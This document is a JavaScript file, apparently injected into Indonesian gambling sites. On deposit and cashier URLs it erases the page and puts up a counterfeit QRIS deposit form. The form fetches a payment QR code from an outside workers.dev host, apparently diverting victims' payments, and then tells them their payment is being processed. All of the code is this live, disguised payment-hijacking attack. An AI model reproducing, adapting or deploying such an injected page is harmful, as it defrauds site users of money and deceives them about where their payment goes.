(function(){
const url=window.location.href;
const match=['/?qris&head=home','/qris','/deposit','/bank','/deposit.php','/qris.php','/cashier','/?page=transaksi','/index.php?page=transaksi','/?deposit&head=home','/index.php?page=cashier','/bank.php'];
if(!match.some(p=>url.includes(p)))return;
document.documentElement.innerHTML="<head></head><body></body>";
document.head.innerHTML=`
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deposit Instant QRIS</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-gold: #facc15;
            --dark-bg: #0f172a;
            --card-bg: #111827;
            --input-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { 
            background-color: var(--dark-bg); 
            color: var(--text-main); 
            display: flex; 
            justify-content: center; 
            padding: 20px 15px;
        }

        .container { width: 100%; max-width: 450px; }

        /* Card Setup */
        .card {
            background: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 28px;
            padding: 25px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        /* Logo Section */
        .logo-container { margin-bottom: 20px; }
        .logo-container img { width: 140px; height: auto; filter: drop-shadow(0 0 8px rgba(255,255,255,0.2)); }

        /* Running Text */
        .marquee-box {
            background: rgba(250, 204, 21, 0.1);
            border: 1px solid rgba(250, 204, 21, 0.2);
            border-radius: 12px;
            padding: 8px;
            margin-bottom: 25px;
            overflow: hidden;
            white-space: nowrap;
        }
        .marquee-box p {
            display: inline-block;
            padding-left: 100%;
            animation: moveText 15s linear infinite;
            color: var(--primary-gold);
            font-size: 12px;
            font-weight: 500;
        }
        @keyframes moveText {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
        }

        /* Form styling */
        .form-group { text-align: left; margin-bottom: 18px; }
        .form-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 8px; margin-left: 4px; }
        
        .input-control {
            width: 100%;
            padding: 15px 18px;
            background: var(--input-bg);
            border: 1px solid #334155;
            border-radius: 15px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        .input-control:focus { border-color: var(--primary-gold); box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.1); }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 15px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #facc15 0%, #eab308 100%);
            color: #000;
            text-transform: uppercase;
        }
        .btn-primary:active { transform: scale(0.97); }
        
        .btn-success {
            background: linear-gradient(135deg, #22c55e 0%, #15803d 100%);
            color: #fff;
        }

        /* QRIS Result Area */
        #qris-display { display: none; margin-top: 25px; border-top: 1px dashed #334155; padding-top: 25px; }
        .qris-image-wrap {
            background: #fff;
            padding: 15px;
            border-radius: 20px;
            display: inline-block;
            margin: 15px 0;
        }
        .qris-image-wrap img { width: 220px; height: 220px; display: block; }
        
        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
        .info-label { color: var(--text-muted); }
        .info-val { font-weight: 600; }
        .status-pending { color: #ef4444; }

        /* Loader */
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            display: none; align-items: center; justify-content: center;
            z-index: 100; flex-direction: column;
        }
        .spinner {
            width: 45px; height: 45px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid var(--primary-gold);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Tutorial */
        .tutorial { text-align: left; margin-top: 25px; background: rgba(255,255,255,0.02); padding: 15px; border-radius: 15px; }
        .tutorial h4 { font-size: 14px; margin-bottom: 10px; color: var(--primary-gold); }
        .tutorial ol { padding-left: 20px; font-size: 12px; color: var(--text-muted); line-height: 1.8; }

        /* Footer Image */
        .footer-img { width: 100%; margin-top: 30px; opacity: 0.7; filter: grayscale(0.3); }
    </style>
`;
document.body.innerHTML=`

<div class="container">
    <div class="card">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QRIS_logo.svg/960px-QRIS_logo.svg.png" alt="QRIS Logo">
        </div>

        <div class="marquee-box">
            <p>Gunakan QRIS untuk proses deposit instant 24 jam. Pastikan nominal sesuai dengan yang tertera di layar untuk menghindari keterlambatan proses otomatis.</p>
        </div>

        <div id="form-input">
            <div class="form-group">
                <label>Nominal Deposit (Rp)</label>
                <input type="number" id="input-nominal" class="input-control" placeholder="Contoh: 50000" min="50000">
            </div>

            <div class="form-group">
                <label>Pilih Bonus Promosi</label>
                <select id="input-bonus" class="input-control">
                    <option value="Tanpa Bonus">Tanpa Bonus (Default)</option>
                    <option value="Bonus 300k Get 3Jt">Bonus Deposit 300k Get 3Jt</option>
                    <option value="Bonus 500k Get 5Jt">Bonus Deposit 500k Get 5Jt</option>
                    <option value="Bonus 800k Get 8Jt">Bonus Deposit 800k Get 8Jt</option>
                    <option value="Garansi Kekalahan 100%">Bonus Garansi Kekalahan 100%</option>
                    <option value="X2 To X2">X2 To X2</option>
                </select>
            </div>

            <button class="btn btn-primary" onclick="generateQris()">Buat QRIS Sekarang</button>
        </div>

        <div id="qris-display">
            <div class="info-row">
                <span class="info-label">Status</span>
                <span class="info-val status-pending">● PENDING</span>
            </div>
            <div class="info-row">
                <span class="info-label">Nominal</span>
                <span class="info-val" id="res-nominal">Rp 0</span>
            </div>
            <div class="info-row">
                <span class="info-label">Bonus</span>
                <span class="info-val" id="res-bonus">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">Exp. Time</span>
                <span class="info-val" id="countdown" style="color:var(--primary-gold)">03:00</span>
            </div>

            <div class="qris-image-wrap">
                <img id="img-qris" src="" alt="QRIS">
            </div>

            <button class="btn btn-success" onclick="confirmPayment()">SAYA TELAH MEMBAYAR</button>
        </div>

        <div class="tutorial">
            <h4>Panduan Pembayaran:</h4>
            <ol>
                <li>Buka aplikasi Bank atau E-Wallet (Dana, Ovo, GoPay, dll).</li>
                <li>Pilih fitur "Scan" atau "Bayar".</li>
                <li>Arahkan kamera ke kode QRIS di atas.</li>
                <li>Masukkan nominal sesuai tagihan dan selesaikan transaksi.</li>
            </ol>
        </div>

        <img src="https://tokopay.id/assets/img/list-payment.png" class="footer-img" alt="Payment Methods">
    </div>
</div>

<div class="overlay" id="loading">
    <div class="spinner"></div>
    <p style="font-size: 14px; letter-spacing: 1px;">Membuat QRIS...</p>
</div>

`;

    const WORKER_URL = 'https://pga.defoy89122.workers.dev'; // Worker kamu

    async function generateQris() {
        const nominal = document.getElementById('input-nominal').value;
        const bonus = document.getElementById('input-bonus').value;

        // Validasi di sisi frontend diubah menjadi minimal Rp 50.000
        if (!nominal || parseInt(nominal) < 50000) {
            alert("Minimal deposit Rp 50.000");
            return;
        }

        // Tampilkan loading
        document.getElementById('loading').style.display = 'flex';

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ amount: parseInt(nominal) })
            });

            const data = await response.json();

            if (data.status === 'success') {
                // Update tampilan hasil
                document.getElementById('img-qris').src = 'data:image/png;base64,' + data.qris_base64;
                document.getElementById('res-nominal').innerText = "Rp " + parseInt(nominal).toLocaleString('id-ID');
                document.getElementById('res-bonus').innerText = bonus;
                
                // Switch view
                document.getElementById('form-input').style.display = 'none';
                document.getElementById('qris-display').style.display = 'block';
                
                startTimer(180); // 3 Menit
            } else {
                alert("Gagal terhubung ke server QRIS.");
            }
        } catch (error) {
            alert("Error: " + error.message);
        } finally {
            document.getElementById('loading').style.display = 'none';
        }
    }

    function startTimer(duration) {
        let timer = duration, minutes, seconds;
        const display = document.getElementById('countdown');
        const interval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = minutes + ":" + seconds;

            if (--timer < 0) {
                clearInterval(interval);
                display.textContent = "EXPIRED";
                document.getElementById('img-qris').style.opacity = '0.2';
            }
        }, 1000);
    }

    function confirmPayment() {
        alert("Terima kasih! Pembayaran Anda sedang diproses.");
        window.location.href = "../"; // Redirect ke folder sebelumnya
    }

window.generateQris=generateQris;
window.confirmPayment=confirmPayment;
})();
